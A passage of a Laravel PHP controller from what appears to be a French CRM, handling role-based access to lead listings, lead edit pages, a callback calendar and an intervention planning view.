        return view('admin.all-leads_new', compact('headers', 'users', 'leads', 'lead_status', 'status', 'default_filters', 'filter_status', 'pagination_number', 'role', 'statut_blue_button_access', 'default_filter_header_id', 'permission_regies', 'regies', 'suppliers', 'lead_sub_status', 'telecommercials', 'user_actions')); 
    }

    public function allLeadsNewDesign($status = null){  
        $headers = LeadHeader::all();  
        $users= User::where('deleted_status', 'no')->where('status', 'active')->get();
        $telecommercials = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->get();
        $lead_status = LeadStatus::all();
        $lead_id = 0;
        $company_name = 'all';
        $inputs = LeadCustomField::all();  
        $lead_sub_status = LeadSubStatus::orderBy('order', 'asc')->get();
        
        if(role() == 's_admin' || role() == 'manager'){
            if($status){
                $leads = Lead::where('user_status', $status)->where('deleted_status', 'no')->orderBy('postal_code', 'asc')->paginate(paginationNumber('lead'));
            }else{
                $leads = Lead::where('user_status', 2)->where('deleted_status', 'no')->orderBy('postal_code', 'asc')->paginate(paginationNumber('lead'));
            }
        }else{
            if($status){
                $leads = Auth::user()->leads()->where('user_status', $status)->where('deleted_status', 'no')->orderBy('postal_code', 'asc')->paginate(paginationNumber('lead'));
            }else{
                $leads = Auth::user()->leads()->where('user_status', 2)->where('deleted_status', 'no')->orderBy('postal_code', 'asc')->paginate(paginationNumber('lead'));
            }
        }
        

        // $ids = LeadAssign::where('user_id', Auth::id())->pluck('lead_id');
        // if(role() == 's_admin'){
        //     foreach($l_status as $item){ 
        //         $lead_status[$item->id] = Lead::where('user_status', $item->id)->where('deleted_status', 'no')->paginate(10);
        //     } 
        //     $lead_status[0] = Lead::where('user_status', 0)->where('deleted_status', 'no')->paginate(10); 
        // }else{
        //     foreach($l_status as $item){
        //         $lead_status[$item->id] = Lead::whereIn('id', $ids)->where('user_status', $item->id)->where('deleted_status', 'no')->paginate(10);
        //     } 
        //     $lead_status[0] = Lead::whereIn('id', $ids)->where('user_status', 0)->where('deleted_status', 'no')->paginate(10); 
        // } 

        return view('admin.all-leads_new_design', compact('headers', 'users', 'lead_id','company_name', 'leads', 'inputs', 'lead_status', 'telecommercials', 'status', 'lead_sub_status')); 
    }

    //lead edit 
    public function LeadEdit($company_id, $lead_id){

        $permission = false;
        $admin__status = false;
        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];
        if(Auth::user()->getRoleName->category_id == 3 || Auth::user()->getRoleName->category_id == 4){
            $admin__status = true;
        }
        
        if(in_array(role(), $administrarif_role)){
            $permission = true;
        }else{
            if(role() == 'sales_manager' || role() == 'sales_manager_externe'){
                $stats_regies = Auth::user()->allRegie; 
                $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
                $leads = LeadClientProject::whereIn('lead_telecommercial', $user_ids)->where('lead_deleted_status', 0)->pluck('id')->toArray();
                if(Auth::user()->getRegieTelecommercial){
                    $permission_lead = LeadClientProject::find($lead_id);
                    if($permission_lead && $permission_lead->lead_label == 1 && $permission_lead->import_regie == Auth::user()->getRegieTelecommercial->id){
                        $permission = true;
                    }
                }
            }else{
                $leads = Auth::user()->getLeads()->pluck('id')->toArray();
            } 
            if(in_array($lead_id, $leads)){
                $permission = true;
            }
        }

        if(!$permission){
            return back();
        }
        
        if (checkAction(Auth::id(), 'lead', 'edit') || in_array(role(), $administrarif_role)){ 
              
            $company = Company::findOrFail($company_id); 
            $lead = LeadClientProject::where('id', $lead_id)->first();  

            if($lead->lead_deleted_status == 1){
                return redirect()->route('leads.all')->with('error', 'Ce prospect est supprimé');
            }

            if($lead->lead_label == 7 && Auth::id() == '102'){
                return redirect()->route('leads.all')->with('error', 'Pas autorisé');
            }

            if($lead && $lead->callback_time && $lead->callback_history_type == 0 && $lead->callback_time < Carbon::now()){
                CallbackHistory::create([
                    'type' => 'lead',
                    'feature_id' => $lead->id,
                    'expired_date' => $lead->callback_time,
                    'callback_user_id' => $lead->callback_user_id,
                    'user_id' => Auth::id(),
                    'status' => '',
                ]);
                $lead->callback_history_type = 1;
                $lead->save();
            }  
            $tax = LeadTax::where('lead_id', $lead_id)->orderBy('primary', 'asc')->get();
            $primary_tax = LeadTax::where('lead_id', $lead_id)->where('primary', 'yes')->first();
              
            $telecommercials = User::where('deleted_status', 'no')->whereIn('role_id', [8,23])->get(); 
            $administrarif_role_id  = Role::where('category_id', '3')->pluck('id');
            $gestionnaires = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', $administrarif_role_id)->get();
            $activities = $lead->getLeadActivity;
            $lead_sub_status = LeadSubStatus::orderBy('order', 'asc')->get();
            $bareme_travaux_tags = BaremeTravauxTag::orderBy('order')->get(); 
            if(role() == 's_admin'){
                $comments = $lead->getLeadComments;
                $categories = CommentCategory::all();
            }else{ 
                $comments = LeadComment::whereIn('category_id', Auth::user()->commentCategory->pluck('id'))->where('lead_id', $lead_id)->orderBy('id', 'desc')->get(); 
                $categories = Auth::user()->commentCategory; 
            }  
            $lead_statuses = LeadStatus::all();
            if($tax->count()>0){
                $collapse_status = true;
            }else {
                $collapse_status = false;
            }  
            
            $assign_users = [];
            if($lead->leadTelecommercial){
                if($lead->leadTelecommercial->getRegie &&  $lead->leadTelecommercial->getRegie->getUser){
                    $assign_users = User::whereIn('id', [$lead->lead_telecommercial, $lead->leadTelecommercial->getRegie->getUser->id])->where('deleted_status', 'no')->where('status', 'active')->get();
                }else{
                    $assign_users = User::whereIn('id', [$lead->lead_telecommercial])->where('deleted_status', 'no')->where('status', 'active')->get();
                }
            }
            $admin_tag_role = Role::whereIn('category_id', [3,4])->where('value', '<>', 'Logistique')->pluck('value')->toArray();
            $admin_users = User::whereIn('role', $admin_tag_role)->where('deleted_status', 'no')->where('status', 'active')->get();

            $tag_users = $admin_users->merge($assign_users);

            $lead_current_label = LeadStatus::find($lead->lead_label); 
            $lead_nouveau = LeadStatus::find(2);
            $lead_en_cours = LeadStatus::find(3);
            $lead_nrp = LeadStatus::find(4);
            $lead_ko = LeadStatus::find(5);
            $lead_validation = LeadStatus::find(6); 
            $address = '';
            if($lead->primaryTax){
                if($lead->primaryTax->google_address){
                    $address = $lead->primaryTax->google_address;
                }else{
                    $address = $lead->Adresse .' '. $lead->Code_Postal .' '. $lead->Ville;
                }
            }
            $location = self::location($address);
            $lat  = $location['status'] == 'success' ? $location['lat'] ?? 48.066709713351116 : 48.066709713351116;
            $lng  = $location['status'] == 'success' ? $location['lng'] ?? -2.965925932451392 : -2.965925932451392;
  
            $lead_sub_status = $lead_current_label->getSubStatus;


            return view('admin.edit-lead', compact('company', 'lead', 'comments', 'activities', 'categories', 'primary_tax', 'collapse_status', 'telecommercials', 'lead_sub_status', 'bareme_travaux_tags', 'gestionnaires', 'lead_statuses', 'tag_users', 'admin__status', 'lead_current_label' , 'lead_nouveau', 'lead_en_cours', 'lead_nrp', 'lead_ko', 'lead_validation', 'lat', 'lng', 'lead_sub_status'));
        }else{
            return back()->with('error', __('You are not authorized to make this action'));
        }
        
        
            
    }
    //lead page 
    public function leadPage($company_id, $lead_id){

        $permission = false;
        $admin__status = false;
        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];

        if(Auth::user()->getRoleName->category_id == 3 || Auth::user()->getRoleName->category_id == 4){
            $admin__status = true;
        }
        
        if(in_array(role(), $administrarif_role)){
            $permission = true;
        }else{
            if(role() == 'sales_manager' || role() == 'sales_manager_externe'){
                $stats_regies = Auth::user()->allRegie; 
                $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
                $leads = LeadClientProject::whereIn('lead_telecommercial', $user_ids)->where('lead_deleted_status', 0)->pluck('id')->toArray();
                if(Auth::user()->getRegieTelecommercial){
                    $permission_lead = LeadClientProject::find($lead_id);
                    if($permission_lead && $permission_lead->lead_label == 1 && $permission_lead->import_regie == Auth::user()->getRegieTelecommercial->id){
                        $permission = true;
                    }
                }
            }else{
                $leads = Auth::user()->getLeads()->pluck('id')->toArray();
            } 
            if(in_array($lead_id, $leads)){
                $permission = true;
            }
        }

        if(!$permission){
            return back();
        }
        
        if (checkAction(Auth::id(), 'lead', 'edit') || in_array(role(), $administrarif_role)){ 
            $company = Company::findOrFail($company_id);
            // $lead = Lead::where('id', $lead_id)->first();  
            $lead = LeadClientProject::where('id', $lead_id)->first();  
 

            if($lead && $lead->callback_time && $lead->callback_history_type == 0 && $lead->callback_time < Carbon::now()){
                CallbackHistory::create([
                    'type' => 'lead',
                    'feature_id' => $lead->id,
                    'expired_date' => $lead->callback_time,
                    'callback_user_id' => $lead->callback_user_id,
                    'user_id' => Auth::id(),
                    'status' => '',
                ]);
                $lead->callback_history_type = 1;
                $lead->save();
            }
            // dd($lead);
            $tax = LeadTax::where('lead_id', $lead_id)->orderBy('primary', 'asc')->get();
            $primary_tax = LeadTax::where('lead_id', $lead_id)->where('primary', 'yes')->first();
            if($primary_tax && $primary_tax->postal_code){
                $tax_zone = getPrimaryZone($primary_tax->postal_code);
                $tax_precariousness = getPrecariousness($lead->Nombre_de_personnes, $lead->Revenue_Fiscale_de_Référence, $primary_tax->postal_code);
            }else{
                $tax_zone = '';
                $tax_precariousness = '';
            }
            $childrens = Children::where('lead_id', $lead_id)->get(); 
            $all_inputs = ProjectCustomField::all();
            // $all_inputs = LeadCustomField::all();
            $telecommercials = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->get();
            // $gestionnaires = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 16)->get();
            $administrarif_role_id  = Role::where('category_id', '3')->pluck('id');
            $gestionnaires = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', $administrarif_role_id)->get();
            $activities = $lead->getLeadActivity;
            $lead_sub_status = LeadSubStatus::orderBy('order', 'asc')->get();
            $bareme_travaux_tags = BaremeTravauxTag::orderBy('order')->get(); 
            if(role() == 's_admin'){
                $comments = $lead->getLeadComments;
                $categories = CommentCategory::all();
            }else{ 
                $comments = LeadComment::whereIn('category_id', Auth::user()->commentCategory->pluck('id'))->where('lead_id', $lead_id)->where('lead_reset_status', 0)->orderBy('id', 'desc')->get(); 
                $categories = Auth::user()->commentCategory; 
            }
            $suppliers = Fournisseur::where('active', 'Oui')->where('type', 'Lead')->get();
            $heatings = HeatingMode::orderBy('order', 'asc')->get();
            $campagne_types = Campagnetype::all();
            $lead_statuses = LeadStatus::all();
            if($tax->count()>0){
                $collapse_status = true;
            }else {
                $collapse_status = false;
            }  
            
            $assign_users = [];
            if($lead->leadTelecommercial){
                if($lead->leadTelecommercial->getRegie &&  $lead->leadTelecommercial->getRegie->getUser){
                    $assign_users = User::whereIn('id', [$lead->lead_telecommercial, $lead->leadTelecommercial->getRegie->getUser->id])->where('deleted_status', 'no')->where('status', 'active')->get();
                }else{
                    $assign_users = User::whereIn('id', [$lead->lead_telecommercial])->where('deleted_status', 'no')->where('status', 'active')->get();
                }
            }
            $admin_tag_role = Role::whereIn('category_id', [3,4])->where('value', '<>', 'Logistique')->pluck('value')->toArray();
            $admin_users = User::whereIn('role', $admin_tag_role)->where('deleted_status', 'no')->where('status', 'active')->get();

            $tag_users = $admin_users->merge($assign_users);

            return view('admin.create-lead', compact('company', 'lead', 'tax', 'childrens', 'all_inputs', 'suppliers', 'comments', 'activities', 'categories', 'primary_tax', 'collapse_status', 'telecommercials', 'lead_sub_status', 'heatings', 'bareme_travaux_tags', 'campagne_types', 'gestionnaires', 'lead_statuses', 'tag_users', 'admin__status'));
        }else{
            return back()->with('error', __('You are not authorized to make this action'));
        }
        
        
            
    }

    // Return Calender view 
    public function Cadendar(){ 
        if(role() == 's_admin'){
            $lead_rapplers = LeadClientProject::whereNotNull('callback_time')->get();
            $client_rapplers = NewClient::whereNotNull('callback_time')->get();
            $project_rapplers = NewProject::whereNotNull('callback_time')->get();
            // $lead_rapplers = LeadClientProject::whereNotNull('callback_time')->whereDate('callback_time', '>=', Carbon::today())->get();
            // $client_rapplers = NewClient::whereNotNull('callback_time')->whereDate('callback_time', '>=', Carbon::today())->get();
            // $project_rapplers = NewProject::whereNotNull('callback_time')->whereDate('callback_time', '>=', Carbon::today())->get();
        }else{ 
            $permission = Permission::where('user_id', Auth::id())->where('name', 'planning.index')->first();
            if(!$permission){
                return redirect()->route('permission.none');
            }

            $lead_rapplers = LeadClientProject::whereNotNull('callback_time')->where('callback_user_id', Auth::id())->get();
            $client_rapplers = NewClient::whereNotNull('callback_time')->where('callback_user_id', Auth::id())->get();
            $project_rapplers = NewProject::whereNotNull('callback_time')->where('callback_user_id', Auth::id())->get();
            // $lead_rapplers = Auth::user()->leadRappler;
            // $client_rapplers = Auth::user()->clientRappler;
            // $project_rapplers = Auth::user()->projectRappler;
        }
        $schedules30 = CarbonInterval::minutes('30')->toPeriod('00:00', '24:00'); 
        foreach($schedules30 as $d){
            $min_30_interval[Carbon::parse($d)->format("G").':'.Carbon::parse($d)->format("i")] = Carbon::parse($d)->format("G").'h'.Carbon::parse($d)->format("i");
        }  
        $projects = NewProject::where('deleted_status', 0)->get()->map(function ($project){
            return [
                'id'            => $project->id,
                'Nom'           => $project->Nom,
                'Prenom'        => $project->Prenom, 
                'Code_Postal'   => $project->Code_Postal, 
                'tag'           => $project->ProjectTravauxTags()->count() > 0 ? implode(',', $project->ProjectTravauxTags->pluck('tag')->toArray()) : '',
            ];
        });

        
        $stats_regies = Auth::user()->allRegie; 
        $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];

        if(in_array(role(), $administrarif_role)){ 
            $project_items = NewProject::where('deleted_status', 0)->orderBy('Code_Postal', 'asc')->get();
            $lead_items = LeadClientProject::where('lead_deleted_status', 0)->orderBy('Code_Postal', 'asc')->get(); 
        }else{  
            if(role() == 'sales_manager' || role() == 'sales_manager_externe'){ 
                $project_items = NewProject::whereIn('project_telecommercial', $user_ids)->where('deleted_status', 0)->orderBy('Code_Postal', 'asc')->get();
                $telecommercials = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->get();
                $lead_items = LeadClientProject::whereIn('lead_telecommercial', $user_ids)->where('lead_deleted_status', 0)->orderBy('Code_Postal', 'asc')->get(); 

            }else{
                $lead_items = Auth::user()->getLeads()->orderBy('Code_Postal', 'asc')->get(); 
                if(role() == 'team_leader'){
                    $team_users = Auth::user()->getTeamUsers;
                    $intervention_project_ids = ProjectIntervention::whereIn('user_id', $team_users->pluck('id'))->whereIn('type', ['Installation', 'SAV', 'Déplacement', 'Contre Visite Technique'])->pluck('project_id')->toArray();
                    $project_items = NewProject::whereIn('id', $intervention_project_ids)->where('deleted_status', 0)->orderBy('Code_Postal', 'asc')->get();                
                }else{  
                    if(role() == 'telecommercial' || role() == 'telecommercial_externe'){
                        $project_items = Auth::user()->getTelecommiercialProjects()->where('deleted_status', 0)->orderBy('Code_Postal', 'asc')->get();
                    }else{
                        $intervention_project_ids = ProjectIntervention::where('user_id', Auth::id())->pluck('project_id')->toArray();
                        $project_items = NewProject::whereIn('id', $intervention_project_ids)->where('deleted_status', 0)->orderBy('Code_Postal', 'asc')->get();
                    } 
                }
            } 

        }
        // return back();
        return view('admin.calendar', [
            'min_30_interval'   => $min_30_interval,  
            'projects'          => $projects,  
            'events'            => role() == 's_admin' ? NewEvent::all() : Auth::user()->createdEvent, 
            'lead_rapplers'     => $lead_rapplers, 
            'client_rapplers'   => $client_rapplers, 
            'project_rapplers'  => $project_rapplers, 
            'project_items'     => $project_items, 
            'lead_items'        => $lead_items, 
        ]);  
        // if($month){ 
        //     $days_in_month = Carbon::now()->month(Carbon::parse($month)->format('m'))->year(Carbon::parse($month)->format('Y'))->daysInMonth; 
        //     $full_month = [];
        //     for($i= 1; $i<= $days_in_month; $i++){
        //         $full_month[] = ['date' => Carbon::now()->day($i)->month(Carbon::parse($month)->format('m'))->year(Carbon::parse($month)->format('Y'))->format('Y-m-d'), 'day' => substr(Carbon::now()->day($i)->month(Carbon::parse($month)->format('m'))->year(Carbon::parse($month)->format('Y'))->locale(app()->getLocale())->translatedFormat('l'), 0, 1)];
        //     } 
        //     return view('admin.new_planning', [ 
        //         'users'         => User::where('deleted_status', 'no')->where('status', 'active')->get(),
        //         'installers'    => User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 2)->get(),
        //         'client'        =>Client::where('id', $client_id)->first(),
        //         'clients'       =>Client::all(),
        //         'category'      => EventCategory::all(),
        //         'event'         => Event::all(), 
        //         'days_in_month' => $days_in_month,
        //         'month'         => Carbon::now()->month(Carbon::parse($month)->format('m'))->year(Carbon::parse($month)->format('Y'))->format('F Y'),
        //         'next_month'    => Carbon::now()->month(Carbon::parse($month)->format('m'))->year(Carbon::parse($month)->format('Y'))->addMonth()->format('Y-m'),
        //         'prev_month'    => Carbon::now()->month(Carbon::parse($month)->format('m'))->year(Carbon::parse($month)->format('Y'))->subMonth()->format('Y-m'),
        //         'first_day'     => Carbon::now()->day(1)->month(Carbon::parse($month)->format('m'))->year(Carbon::parse($month)->format('Y'))->format('Y-m-d'),
        //         'last_day'      => Carbon::parse(Carbon::now()->day($days_in_month)->month(Carbon::parse($month)->format('m'))->year(Carbon::parse($month)->format('Y'))->format('Y-m-d'))->addDay()->format('Y-m-d'),
        //         'full_month'    => $full_month,
        //     ]); 
        // }else{
        //     $days_in_month = Carbon::now()->daysInMonth; 
        //     $full_month = [];
        //     for($i= 1; $i<= $days_in_month; $i++){
        //         $full_month[] = ['date' => Carbon::now()->day($i)->format('Y-m-d'), 'day' => substr(Carbon::now()->day($i)->locale(app()->getLocale())->translatedFormat('l'), 0, 1)];
        //     } 
        //     return view('admin.new_planning', [ 
        //         'users'         => User::where('deleted_status', 'no')->where('status', 'active')->get(),
        //         'installers'    => User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 2)->get(),
        //         'client'        => Client::where('id', $client_id)->first(),
        //         'clients'       => Client::all(),
        //         'category'      => EventCategory::all(),
        //         'event'         => Event::all(), 
        //         'days_in_month' => $days_in_month,
        //         'month'         => Carbon::now()->format('F Y'),
        //         'next_month'    => Carbon::now()->addMonth()->format('Y-m'),
        //         'prev_month'    => Carbon::now()->subMonth()->format('Y-m'),
        //         'first_day'     => Carbon::now()->day(1)->format('Y-m-d'),
        //         'last_day'      => Carbon::now()->day($days_in_month+1)->format('Y-m-d'),
        //         'full_month'    => $full_month,
        //     ]); 
        // }
    }

    // Return Planning view 
    public function planning($month = null){  

        if($month){ 
            if(planningView() == 30){
                if(Carbon::parse($month)->format('d') == 1){
                    $days_in_month = Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->daysInMonth;  
                    $first_day     = Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day(1)->format('Y-m-d');
                    $last_day      = Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day($days_in_month)->format('Y-m-d');
                    $full_month = [];
                    for($i= 1; $i<= $days_in_month; $i++){
                        $full_month[] = ['date' => Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day($i)->format('Y-m-d'), 'day' => Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day($i)->locale(app()->getLocale())->translatedFormat('l')];
                    }  
                    $next_month    = Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->addMonth()->format('Y-m-d');
                    $prev_month    = Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->subMonth()->format('Y-m-d');
                }else{
                    $days_in_month  = planningView();  
                    $first_day      =$month;
                    $last_day       = Carbon::parse($month)->addDays($days_in_month -1)->format('Y-m-d'); 
                    $next_month     = Carbon::parse($month)->addDays($days_in_month)->format('Y-m-d');
                    $prev_month     = Carbon::parse($month)->subDays($days_in_month)->format('Y-m-d');
                    $start          = Carbon::parse($month)->format('d'); 
                    $end            = Carbon::parse($month)->format('d') + $days_in_month; 
                    $full_month = [];
                    for($i = $start; $i< $end; $i++){ 
                        $full_month[] = ['date' => Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day($i)->format('Y-m-d'), 'day' => Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day($i)->locale(app()->getLocale())->translatedFormat('l')];
                    }  
                }
            }else{  
                $days_in_month  = planningView();  
                $first_day      =$month;
                $last_day       = Carbon::parse($month)->addDays($days_in_month -1)->format('Y-m-d'); 
                $next_month     = Carbon::parse($month)->addDays($days_in_month)->format('Y-m-d');
                $prev_month     = Carbon::parse($month)->subDays($days_in_month)->format('Y-m-d');
                $start          = Carbon::parse($month)->format('d'); 
                $end            = Carbon::parse($month)->format('d') + $days_in_month; 
                $full_month = [];
                for($i = $start; $i< $end; $i++){ 
                    $full_month[] = ['date' => Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day($i)->format('Y-m-d'), 'day' => Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day($i)->locale(app()->getLocale())->translatedFormat('l')];
                }  
            } 


            $current_date   = $month; 
            $month          = Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->locale(app()->getLocale())->translatedFormat('F Y');
            $url_status     = 1;
        }else{
            if(planningView() == 30){
                $days_in_month  = Carbon::today()->daysInMonth;  
                $first_day      = Carbon::today()->day(1)->format('Y-m-d');
                $last_day       = Carbon::today()->days($days_in_month)->format('Y-m-d'); 
                $next_month     = Carbon::today()->addMonth()->format('Y-m-d');
                $prev_month     = Carbon::today()->subMonth()->format('Y-m-d'); 
                $full_month = [];
                for($i= 1; $i<= $days_in_month; $i++){
                    $full_month[] = ['date' => Carbon::today()->day($i)->format('Y-m-d'), 'day' => Carbon::today()->day($i)->locale(app()->getLocale())->translatedFormat('l')];
                }  
            }else{
                $days_in_month  = planningView();  
                $first_day      = Carbon::today()->format('Y-m-d');
                $start          = Carbon::today()->format('d'); 
                $end            =  Carbon::today()->format('d') + $days_in_month; 
                $last_day       = Carbon::today()->addDays($days_in_month -1)->format('Y-m-d'); 
                $next_month     = Carbon::today()->addDays($days_in_month)->format('Y-m-d');
                $prev_month     = Carbon::today()->subDays($days_in_month)->format('Y-m-d');
                $full_month = [];
                for($i = $start; $i< $end; $i++){ 
                    $full_month[] = ['date' => Carbon::today()->day($i)->format('Y-m-d'), 'day' => Carbon::today()->day($i)->locale(app()->getLocale())->translatedFormat('l')];
                } 
            }  
            $month          = Carbon::today()->locale(app()->getLocale())->translatedFormat('F Y'); 
            $current_date   = Carbon::today()->format('Y-m-d'); 
            $url_status     = 0;
        }  
        
        $projects = NewProject::where('deleted_status', 0)->get()->map(function ($project){
            return [
                'id'            => $project->id,
                'Nom'           => $project->Nom,
                'Prenom'        => $project->Prenom, 
                'Code_Postal'   => $project->Code_Postal, 
                'tag'           => $project->ProjectTravauxTags()->count() > 0 ? implode(',', $project->ProjectTravauxTags->pluck('tag')->toArray()) : '',
            ];
        });
        $min_30_interval = []; 
        $schedules30 = CarbonInterval::minutes('30')->toPeriod('00:00', '24:00'); 
        foreach($schedules30 as $d){
            $min_30_interval[] = Carbon::parse($d)->format("G").'h'.Carbon::parse($d)->format("i");
        }  
        // $interventions = ProjectIntervention::whereBetween('Date_intervention', [$first_day, $last_day])->orderBy('Date_intervention', 'asc')->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get();
        // $administrarif_role = Role::where('category_id', '3')->pluck('value')->toArray();
        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];
        $all_access = false;
        if(in_array(role(), $administrarif_role)){
            $all_access = true;
        }

        $sales_user = false;
        
        if(role() == 'sales_manager' || role() == 'sales_manager_externe'){
            $sales_user = true;

            
            $stats_regies = Auth::user()->allRegie; 
            $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
            $projects_id = NewProject::whereIn('project_telecommercial', $user_ids)->where('deleted_status', 0)->pluck('id');
            $interventions = ProjectIntervention::whereBetween('Date_intervention', [$first_day, $last_day])->where('type', '<>', 'Déplacement')->where('type', '<>', 'SAV')->whereIn('project_id', $projects_id)->with('getProject', 'getUser', 'getStatusPlanning')->orderBy('Date_intervention', 'asc')->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get();
            
            $interventions_id = ProjectIntervention::whereBetween('Date_intervention', [$first_day, $last_day])->where('type', '<>', 'Déplacement')->where('type', '<>', 'SAV')->whereIn('project_id', $projects_id)->pluck('user_id');
            $filtered_users = User::whereIn('id', $interventions_id)->where('deleted_status', 'no')->where('status', 'active')->get();

        }else if(role() == 'team_leader'){
            $sales_user = true;
            $team_users = Auth::user()->getTeamUsers; 
            $interventions = ProjectIntervention::whereBetween('Date_intervention', [$first_day, $last_day])->whereIn('user_id', $team_users->pluck('id'))->whereIn('type', ['Installation', 'SAV', 'Déplacement', 'Contre Visite Technique'])->with('getProject', 'getUser', 'getStatusPlanning')->orderBy('Date_intervention', 'asc')->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get();

            $interventions_id = ProjectIntervention::whereBetween('Date_intervention', [$first_day, $last_day])->whereIn('user_id', $team_users->pluck('id'))->whereIn('type', ['Installation', 'SAV', 'Déplacement', 'Contre Visite Technique'])->pluck('user_id');
            $filtered_users = User::whereIn('id', $interventions_id)->where('deleted_status', 'no')->where('status', 'active')->get();
        }else if(role() == 'Referent_Technique'){
            // $sales_user = true; 
            $users_id = User::whereIn('role_id', [4, 9])->pluck('id'); 

            $interventions = ProjectIntervention::whereBetween('Date_intervention', [$first_day, $last_day])->whereIn('user_id', $users_id)->whereIn('type', ['Pré-Visite Technico-Commercial', 'Etude'])->with('getProject', 'getUser', 'getStatusPlanning')->orderBy('Date_intervention', 'asc')->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get();

            $interventions_id = ProjectIntervention::whereBetween('Date_intervention', [$first_day, $last_day])->whereIn('user_id', $users_id)->whereIn('type', ['Pré-Visite Technico-Commercial', 'Etude'])->pluck('user_id');
            $filtered_users = User::whereIn('id', $interventions_id)->where('deleted_status', 'no')->where('status', 'active')->get();
        }else if(role() == 'Logistique'){
            $sales_user = true; 
            $users_id = User::where('role_id', 2)->pluck('id'); 

            $interventions = ProjectIntervention::whereBetween('Date_intervention', [$first_day, $last_day])->whereIn('user_id', $users_id)->where('type', 'Installation')->with('getProject', 'getUser', 'getStatusPlanning')->orderBy('Date_intervention', 'asc')->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get();

            $interventions_id = ProjectIntervention::whereBetween('Date_intervention', [$first_day, $last_day])->whereIn('user_id', $users_id)->where('type', 'Installation')->pluck('user_id');
            $filtered_users = User::whereIn('id', $interventions_id)->where('deleted_status', 'no')->where('status', 'active')->get();

        }else{
            if(role() == 'telecommercial' || role() == 'telecommercial_externe'){
                $sales_user = true;
                
                $projects_id = NewProject::where('project_telecommercial', Auth::id())->where('deleted_status', 0)->pluck('id');
                $interventions = ProjectIntervention::whereBetween('Date_intervention', [$first_day, $last_day])->where('type', '<>', 'Déplacement')->where('type', '<>', 'SAV')->whereIn('project_id', $projects_id)->with('getProject', 'getUser', 'getStatusPlanning')->orderBy('Date_intervention', 'asc')->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get();

                $interventions_id = ProjectIntervention::whereBetween('Date_intervention', [$first_day, $last_day])->where('type', '<>', 'Déplacement')->where('type', '<>', 'SAV')->whereIn('project_id', $projects_id)->pluck('user_id');
                $filtered_users = User::whereIn('id', $interventions_id)->where('deleted_status', 'no')->where('status', 'active')->get();
            }else{
                 $filtered_users = Auth::user()->planningFilterUsers;
                 $interventions = ProjectIntervention::whereBetween('Date_intervention', [$first_day, $last_day])->with('getProject', 'getUser', 'getStatusPlanning')->orderBy('Date_intervention', 'asc')->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get();
            } 
        }

        return view('admin.new_planning', [  
            'interventions'             => $interventions,
            'departments'               => ZoneInfo::all(),
            'url_status'                => $url_status,
            'current_date'              => $current_date,
            'filteredUser'              => $filtered_users, 
            'roles'                     => Role::findMany([2,4,6,9]), 
            'all_access'                => $all_access,
            'sales_user'                => $sales_user,
            'days_in_month'             => $days_in_month,
            'month'                     => $month, 
            'next_month'                => $next_month, 
            'prev_month'                => $prev_month,  
            'full_month'                => $full_month,
            'projects'                  => $projects, 
            'users'                     => User::where('deleted_status', 'no')->where('status', 'active')->get(), 
            'min_30_interval'           => $min_30_interval,
            'status_planning'           => StatusPlanningIntervention::all(),  
            'bareme_travaux_tags'       => BaremeTravauxTag::orderBy('order')->get(),  
            'users'                     => User::where('deleted_status', 'no')->where('status', 'active')->get(),  
            'filter_role'               => Role::findMany([2,4,6,9]), 
        ]);
    }

    public function planningInterventionStore(Request $request){
        $request->validate([
            'project_id'=> 'required',
            'type'=> 'required',
        ]); 
        $intervention = new ProjectIntervention(); 
